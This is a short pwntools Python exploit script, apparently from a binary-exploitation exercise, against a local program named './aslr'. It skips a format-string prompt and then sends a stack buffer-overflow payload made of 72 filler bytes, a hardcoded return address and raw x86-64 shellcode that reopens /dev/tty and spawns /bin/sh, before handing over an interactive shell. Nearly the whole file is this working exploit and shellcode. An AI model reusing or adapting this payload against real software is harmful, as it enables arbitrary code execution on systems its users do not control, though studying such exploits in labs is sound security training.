#!/usr/bin/env python3
from pwn import *

# Open up the process
p = process("./aslr", stdin=PTY)

# Read until we hit the ": " character at the end of the prompt
# Can't use p.readline() b/c there's no "\n" character at the end of the first prompt
p.readuntil(": ")

# Ignore the format string vulnerability for now
p.sendline("")

# Hardcoded address of shellcode
addr = p64(0x7fffffffdff0 + 80)

# Generate the payload
shellcode = b'\x66\x81\xec\x2c\x01\x48\x31\xc0\x48\x31\xff\xb0\x03\x0f\x05\x50\x48\xbf\x2f\x64\x65\x76\x2f\x74\x74\x79\x57\x54\x5f\x50\x5e\x66\xbe\x02\x27\xb0\x02\x0f\x05\x48\x31\xc0\xb0\x3b\x48\x31\xdb\x53\xbb\x6e\x2f\x73\x68\x48\xc1\xe3\x10\x66\xbb\x62\x69\x48\xc1\xe3\x10\xb7\x2f\x53\x48\x89\xe7\x48\x83\xc7\x01\x48\x31\xf6\x48\x31\xd2\x0f\x05'
useless = b'A' * 72
payload = useless + addr + shellcode

# Exploit the buffer overflow
p.sendline(payload)
p.interactive()
